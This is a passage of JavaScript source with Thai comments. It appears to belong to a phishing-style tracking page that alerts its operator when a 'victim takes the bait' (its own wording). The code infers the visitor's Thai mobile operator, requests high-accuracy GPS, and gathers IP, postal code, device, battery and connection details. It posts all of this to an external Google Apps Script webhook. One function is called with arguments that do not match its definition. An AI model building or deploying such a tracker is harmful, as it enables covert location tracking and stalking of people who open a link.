    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();
    
    // ตรวจสอบว่าอยู่ในประเทศไทยหรือไม่
    const isThailand = ipDetails.country === "TH" || 
                       ipDetails.countryName === "ไทย" || 
                       ipDetails.countryName === "Thailand";
    
    // ตั้งรหัสประเทศ
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;
      
      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
      if (isThailand) {
        phoneInfo.countryCode = "+66";
      }
    }
    
    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp/org
    const ispInfo = (ipDetails.isp || "").toLowerCase();
    const orgInfo = (ipDetails.org || "").toLowerCase();
    
    // ตรวจสอบผู้ให้บริการในประเทศไทยจากข้อมูล ISP (มีรายละเอียดมากขึ้น)
    const thaiOperators = {
      "AIS": [
        "ais", "advanced info service", "awn", "advanced wireless network", 
        "intouch", "shinawatra", "advanc", "advanced"
      ],
      "DTAC": [
        "dtac", "total access communication", "dtn", "dtac trinet", 
        "telenor", "dtc", "tat"
      ],
      "TRUE": [
        "true", "true move", "truemove", "true corporation", "trueonline", 
        "real future", "real move", "true visions", "truevisions", "cp group"
      ],
      "NT": [
        "cat", "tot", "national telecom", "nt", "cat telecom", 
        "tot public company limited", "communications authority of thailand",
        "telephone organization of thailand"
      ],
      "3BB": [
        "triple t broadband", "3bb", "triple t internet", "three bb", 
        "jasmine", "jas", "jasmine international"
      ],
      "AIS Fibre": [
        "ais fibre", "ais fiber"
      ],
      "TRUE Online": [
        "true online", "true internet", "true leased line"
      ],
      "SINET": [
        "sinet", "solutions internet network", "สิเน็ต"
      ],
      "CS LOXINFO": [
        "cs loxinfo", "csloxinfo", "loxinfo", "internet thailand"
      ]
    };
    
    // ค้นหาผู้ให้บริการจากชื่อ ISP/org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword) || orgInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        
        // ระบุว่าเป็น ISP/Mobile
        if (['AIS Fibre', '3BB', 'TRUE Online', 'SINET', 'CS LOXINFO'].includes(operator)) {
          phoneInfo.networkType = "ผู้ให้บริการอินเทอร์เน็ตบ้าน";
        } else {
          phoneInfo.networkType = "ผู้ให้บริการโทรศัพท์มือถือ";
        }
        
        break;
      }
    }
    
    // ตรวจสอบจาก Network Information API ว่าใช้การเชื่อมต่อแบบใด
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      if (connection.type === 'cellular') {
        phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ";
        if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
          phoneInfo.remarks += " " + phoneInfo.possibleOperator;
        }
        phoneInfo.networkType = "เครือข่ายมือถือ";
      } else if (connection.type === 'wifi') {
        phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
        phoneInfo.networkType = "WiFi";
        
        // หากยังไม่รู้ผู้ให้บริการและอยู่ในไทย อาจประมาณการจากเมือง/ภูมิภาค
        if (isThailand && phoneInfo.possibleOperator === "ไม่สามารถระบุได้") {
          // ตัวอย่างการประมาณการจากพื้นที่ (ใช้ข้อมูลจริงได้ละเอียดกว่านี้)
          if (ipDetails.city) {
            const city = ipDetails.city.toLowerCase();
            if (city.includes("bang") || city === "bangkok" || city === "กรุงเทพ") {
              phoneInfo.remarks += " (กรุงเทพฯ - มีผู้ให้บริการหลากหลาย)";
            }
          }
        }
      } else if (connection.type === 'ethernet') {
        phoneInfo.remarks = "เชื่อมต่อผ่านสายแลน";
        phoneInfo.networkType = "Fixed Line";
      }
    }

    // ดูจากเว็บเบราว์เซอร์สำหรับ mobile browser ที่อาจบ่งบอกผู้ให้บริการได้
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // สมาร์ทโฟน Android อาจมีข้อมูลอื่นๆ ที่บ่งบอกผู้ให้บริการ
      if (phoneInfo.possibleOperator === "ไม่สามารถระบุได้") {
        if (userAgent.includes("SM-")) {
          phoneInfo.deviceType = "Samsung";
          // สมมุติว่า Samsung ในไทยส่วนใหญ่อาจใช้ AIS/TRUE
          if (isThailand) {
            phoneInfo.remarks += " (อุปกรณ์ Samsung - ในไทยนิยมใช้กับ AIS, TRUE)";
          }
        } else if (userAgent.includes("Xiaomi") || userAgent.includes("Redmi")) {
          phoneInfo.deviceType = "Xiaomi";
          // สมมุติว่า Xiaomi/Redmi ในไทยบางส่วนอาจใช้ DTAC/TRUE
          if (isThailand) {
            phoneInfo.remarks += " (อุปกรณ์ Xiaomi/Redmi - ในไทยนิยมใช้กับ TRUE, DTAC)";
          }
        }
      }
    } else if (userAgent.includes("iPhone")) {
      phoneInfo.deviceType = "iPhone";
      // iPhone ในไทยมักใช้ AIS/TRUE มากกว่า (สมมุติ)
      if (isThailand && phoneInfo.possibleOperator === "ไม่สามารถระบุได้") {
        phoneInfo.remarks += " (iPhone ในไทยนิยมใช้กับ AIS, TRUE มากกว่า)";
      }
    }
    
    // เพิ่มข้อมูลประเทศ (ถ้ามี)
    if (ipDetails.countryName && ipDetails.countryName !== "ไม่ทราบ") {
      phoneInfo.country = ipDetails.countryName;
    }

    return phoneInfo;
  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
